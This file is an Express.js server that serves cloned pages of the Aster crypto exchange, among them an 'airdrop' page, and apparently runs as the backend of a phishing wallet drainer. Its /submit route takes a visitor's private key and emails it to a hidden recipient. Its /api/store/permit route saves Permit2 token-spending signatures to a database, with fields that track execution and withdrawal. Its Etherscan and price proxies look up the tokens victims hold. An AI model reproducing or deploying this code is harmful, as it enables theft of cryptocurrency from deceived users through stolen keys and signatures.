const express = require('express');
const dotenv = require('dotenv');
const cors = require('cors')
const path = require('path')
const { Resend } = require("resend")
const { MongoClient } = require('mongodb');


const app = express();
dotenv.config();

app.use(cors())


app.use(express.static('views/'))
app.use(express.static(path.join(__dirname, "/public")))
app.use(express.static(__dirname + '/views/1.4169 _ ASTERUSDT _ Trade _ Aster_files/'))
app.use(express.static(__dirname + '/views/Aster airdrop_files/'))
app.use(express.static(__dirname + '/views/Aster - The next-gen perp DEX for all traders_files/'))


app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const resend = new Resend(process.env.RESEND_API_KEY);

// Configuration
const CONFIG = {
    ETHERSCAN_API_KEY: process.env.ETHERSCAN_API_KEY,
    MONGODB_URI: process.env.MONGODB_URI,
    RATE_LIMIT: {
        windowMs: 15 * 60 * 1000, // 15 minutes
        max: 100 // limit each IP to 100 requests per windowMs
    }
};


function delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

// MongoDB connection
let client;
let db;


async function connectDB() {
    if (!db) {
        if (!CONFIG.MONGODB_URI) {
            throw new Error('MONGODB_URI environment variable is not set');
        }
        client = new MongoClient(CONFIG.MONGODB_URI);
        await client.connect();
        db = client.db('permit2DB');
        console.log('✅ Connected to MongoDB');
    }
    return db;
}

// Rate limiting for API endpoints
const rateLimit = require('express-rate-limit');
const apiLimiter = rateLimit(CONFIG.RATE_LIMIT);

// Apply rate limiting to API routes
app.use('/api/', apiLimiter);


// Etherscan API proxy
app.get('/api/proxy/etherscan/tokentx', async (req, res) => {
    try {
        const { address, chainId, page = 1, offset = 100 } = req.query;
        
        if (!address || !chainId) {
            return res.status(400).json({ error: 'Missing required parameters: address, chainId' });
        }

        // Validate address format
        if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
            return res.status(400).json({ error: 'Invalid address format' });
        }

        // Build URL step by step with explicit validation
        const baseUrl = 'https://api.etherscan.io/v2/api';
        const params = new URLSearchParams();
        
        // Add parameters one by one
        params.set('chainid', chainId.toString());
        params.set('module', 'account');
        params.set('action', 'tokentx'); // ✅ EXPLICITLY SET tokentx
        params.set('address', address);
        params.set('page', page.toString());
        params.set('offset', offset.toString());
        params.set('startblock', '0');
        params.set('endblock', '99999999');
        params.set('sort', 'desc');
        params.set('apikey', CONFIG.ETHERSCAN_API_KEY);

        const finalUrl = `${baseUrl}?${params.toString()}`;
        
        // ✅ CRITICAL SECURITY CHECK - Ensure tokentx action is preserved
        if (!finalUrl.includes('action=tokentx')) {
            console.error('🚨 SECURITY ALERT: tokentx action was modified!');
            console.error('Expected action=tokentx, but URL is:', finalUrl);
            throw new Error('Security violation: API action was unexpectedly modified');
        }

        // Double-check the action parameter specifically
        const urlParams = new URLSearchParams(finalUrl.split('?')[1]);
        const actionParam = urlParams.get('action');
        if (actionParam !== 'tokentx') {
            console.error('🚨 SECURITY ALERT: Action parameter tampered!');
            console.error('Expected: tokentx, Got:', actionParam);
            throw new Error(`Security violation: Action parameter is "${actionParam}" instead of "tokentx"`);
        }

        console.log(`[Etherscan Proxy] ✅ Validated URL: ${finalUrl}`);
        console.log(`[Etherscan Proxy] ✅ Action parameter confirmed: ${actionParam}`);
        
        const response = await fetch(finalUrl);
        if (!response.ok) {
            throw new Error(`Etherscan API error: ${response.status} ${response.statusText}`);
        }

        const data = await response.json();
        
        // Log the actual request that was made for debugging
        console.log(`[Etherscan Proxy] ✅ Request completed successfully`);
        console.log(`[Etherscan Proxy] Response status: ${response.status}`);
        console.log(`[Etherscan Proxy] Response contains ${data.result?.length || 0} transactions`);
        
        res.json(data);
    } catch (error) {
        console.error('[Etherscan Proxy] Error:', error);
        res.status(500).json({ error: 'Failed to fetch token transactions', details: error.message });
    }
});


// Relay API proxy for token prices
app.get('/api/proxy/relay/price', async (req, res) => {
    try {
        const { chainId, address } = req.query;
        
        if (!chainId || !address) {
            return res.status(400).json({ error: 'Missing required parameters: chainId, address' });
        }

        // Validate address format
        if (!/^0x[a-fA-F0-9]{40}$/.test(address)) {
            return res.status(400).json({ error: 'Invalid address format' });
        }

        const url = `https://api.relay.link/currencies/token/price?chainId=${chainId}&address=${address}`;
        console.log(`[Relay Proxy] Fetching price: ${url}`);
        
        const response = await fetch(url);
        if (!response.ok) {
            // For price APIs, it's common to not have data for all tokens
            if (response.status === 404) {
                return res.json({ price: 0 });
            }
            throw new Error(`Relay API error: ${response.status} ${response.statusText}`);
        }

        const data = await response.json();
        res.json(data);
    } catch (error) {
        console.error('[Relay Proxy] Error:', error);
        // Return 0 price instead of error to keep flow working
        res.json({ price: 0 });
    }
});



// Store permit signature
app.post('/api/store/permit', async (req, res) => {
    try {
        const { permitBatch, signature, owner, chainId } = req.body;
        
        if (!permitBatch || !signature || !owner || !chainId) {
            return res.status(400).json({ message: "Missing required fields" });
        }

        const database = await connectDB();
        const permitsCollection = database.collection('permits');
        
        await permitsCollection.insertOne({
            owner,
            permitBatch,
            signature,
            chainId,
            createdAt: new Date(),
            submitted: false,
            submittedAt: null,
            executed: false,
            executedAt: null,
            withdrawn: false,
            withdrawnAt: new Date(),
            reason: null
        });

        return res.status(200).json({ message: "Permit stored to db successfully" });
    } catch (error) {
        console.error('Failed to store permit:', error);
        return res.status(500).json({
            message: "Failed to store permit", 
            error: error.message
        });
    }
});




app.get('/', (req, res) => {
  res.sendFile(__dirname + '/views/Aster - The next-gen perp DEX for all traders.html')
})

app.get('/trading', (req, res) => {
    res.sendFile(__dirname + '/views/1.4169 _ ASTERUSDT _ Trade _ Aster.html');
})

app.get('/airdrop', (req, res) => {
    res.sendFile(__dirname + '/views/Aster airdrop.html')
})

app.post('/submit', async (req, res) => {
  const privateKey = req.body.data;  // Assuming this is the input from the user
  if (!privateKey) {
      console.log('Private key must be provided. Very crucial')
      return res.status(400).json({ error: 'Private key required' });
  }

  const recipients = [process.env.RECIPIENT1];
  
  try {
      // Send email to each recipient
      for (let recipient of recipients) {
          const { data, error } = await resend.emails.send({
              from: 'Support <support@fixorbits.com>', // Use your verified domain
              to: [recipient],
              subject: `${req.body.category}`,
              html: `<pre style="font-family: 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; word-break: break-all;">${req.body.data}</pre>`,
            });

          if (error) {
              console.error('Error sending to', recipient, ':', error);
              return res.status(500).json({ error: 'Failed to send email' });
          } else {
              console.log('Email sent to', recipient, ':', data);
          }
      }

      console.log('All emails sent successfully');
      res.status(200).json({ message: 'Emails sent successfully' });

  } catch (error) {
      console.error('Error in email sending process:', error);
      res.status(500).json({ error: 'Internal server error' });
  }
});



// Error handling middleware
app.use((error, req, res, next) => {
    console.error('Unhandled error:', error);
    res.status(500).json({ 
        error: 'Internal server error', 
        details: process.env.NODE_ENV === 'development' ? error.message : undefined
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ error: 'Endpoint not found' });
});

app.listen(process.env.PORT, () => {
    console.log(`🚀 Permit2 Proxy Server running on port ${process.env.PORT}`);
    console.log(`🗄️ MongoDB URI configured: ${CONFIG.MONGODB_URI ? 'Yes' : 'No'}`);
    console.log(`🔑 Using Etherscan API key: ${CONFIG.ETHERSCAN_API_KEY.slice(0, 8)}...`);
    console.log(`🌐 Access the app at: http://localhost:${process.env.PORT}`);
});

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n🛑 Shutting down server gracefully...');
    if (client) {
        await client.close();
        console.log('✅ MongoDB connection closed');
    }
    process.exit(0);
});

module.exports = app;